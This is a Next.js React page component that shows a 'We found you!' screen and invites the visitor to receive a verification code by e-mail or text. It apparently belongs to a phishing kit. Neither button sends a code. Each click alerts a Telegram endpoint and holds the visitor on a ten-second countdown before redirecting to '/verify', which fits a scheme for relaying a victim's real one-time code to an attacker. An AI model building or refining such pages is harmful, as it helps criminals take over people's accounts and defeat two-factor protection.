"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { Mail, Phone, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { SiteHeader } from "@/components/site-header";

export default function VerifyChoicePage() {
  const router = useRouter();
  const [isLoading, setIsLoading] = useState(false);
  const [selectedMethod, setSelectedMethod] = useState<string | null>(null);
  const [email, setEmail] = useState<string>("");
  const [phone, setPhone] = useState<string>("");
  const [countdown, setCountdown] = useState(0);
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);

  // Mask email/phone on component mount (fetch from session/API if needed)
  useEffect(() => {
    // In a real app, you'd fetch these from your backend
    // For now, using placeholder masked values
    setEmail("****@example.com");
    setPhone("***-***-****");
  }, []);

  const maskEmail = (email: string) => {
    const parts = email.split("@");
    if (parts.length !== 2) return email;
    const localPart = parts[0];
    const masked =
      localPart.substring(0, 1) +
      "*".repeat(Math.max(0, localPart.length - 2)) +
      localPart.substring(localPart.length - 1);
    return masked + "@" + parts[1];
  };

  const maskPhone = (phone: string) => {
    const digits = phone.replace(/\D/g, "");
    if (digits.length < 10) return phone;
    return "*".repeat(3) + "-*".repeat(3) + "-" + digits.slice(-4);
  };

  const handleSelect = async (method: "email" | "text") => {
    if (isLoading) return;
    setSelectedMethod(method);
    setIsLoading(true);
    setCountdown(10);

    countdownRef.current = window.setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) {
            window.clearInterval(countdownRef.current);
            countdownRef.current = null;
          }
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    try {
      await fetch("/api/telegram/verification-click", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          verificationType: method === "email" ? "Email" : "Text",
        }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send verification-click notification:", err);
    }

    redirectRef.current = window.setTimeout(() => {
      router.push("/verify");
    }, 10000);
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) window.clearInterval(countdownRef.current);
      if (redirectRef.current) window.clearTimeout(redirectRef.current);
    };
  }, []);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <SiteHeader />
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-md">
          {/* Message */}
          <p className="text-center text-gray-700 mb-8">
            We found you! Pick a method to receive a verification code now.
          </p>

          {/* Email Option */}
          <div className="flex items-center justify-between gap-4 mb-6">
            <div className="flex items-center gap-3 flex-1">
              <Mail className="w-5 h-5 text-gray-600 shrink-0" />
              <span className="text-gray-700">Send code to email: {email}</span>
            </div>
            <Button
              type="button"
              disabled={isLoading}
              onClick={() => handleSelect("email")}
              className={`shrink-0 ${
                selectedMethod === "email" && isLoading
                  ? "bg-[#0d4a5e] hover:bg-[#0d4a5e]"
                  : "bg-[#0d4a5e] hover:bg-[#0d3a4e]"
              } text-white px-4 py-2 rounded h-10 flex items-center gap-2`}
            >
              {selectedMethod === "email" && isLoading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <Mail className="w-4 h-4" />
              )}
              E-MAIL
            </Button>
          </div>

          {/* Phone Option */}
          <div className="flex items-center justify-between gap-4 mb-8">
            <div className="flex items-center gap-3 flex-1">
              <Phone className="w-5 h-5 text-gray-600 shrink-0" />
              <span className="text-gray-700">Send code via text: {phone}</span>
            </div>
            <Button
              type="button"
              disabled={isLoading}
              onClick={() => handleSelect("text")}
              className={`shrink-0 ${
                selectedMethod === "text" && isLoading
                  ? "bg-[#0d4a5e] hover:bg-[#0d4a5e]"
                  : "bg-[#0d4a5e] hover:bg-[#0d3a4e]"
              } text-white px-4 py-2 rounded h-10 flex items-center gap-2`}
            >
              {selectedMethod === "text" && isLoading ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <Phone className="w-4 h-4" />
              )}
              TEXT
            </Button>
          </div>

          {/* Buttons */}
          <div className="flex items-center gap-3 mb-6">
            <Button
              type="button"
              variant="outline"
              disabled={isLoading}
              className="flex-1 rounded bg-gray-200 hover:bg-gray-300 text-gray-800 border-gray-300 h-10 disabled:opacity-70 disabled:cursor-not-allowed"
              onClick={() => router.push("/")}
            >
              ✕ CANCEL
            </Button>
            <Button
              type="button"
              variant="outline"
              disabled={isLoading}
              className="flex-1 rounded bg-gray-300 hover:bg-gray-400 text-gray-800 border-gray-400 h-10 disabled:opacity-70 disabled:cursor-not-allowed"
              onClick={() => router.back()}
            >
              ← BACK
            </Button>
          </div>

          {/* Help Link */}
          <div className="text-center">
            <button
              type="button"
              className="text-blue-500 hover:underline text-sm"
              onClick={() => router.push("/forgot-password")}
            >
              I cannot receive a verification code
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
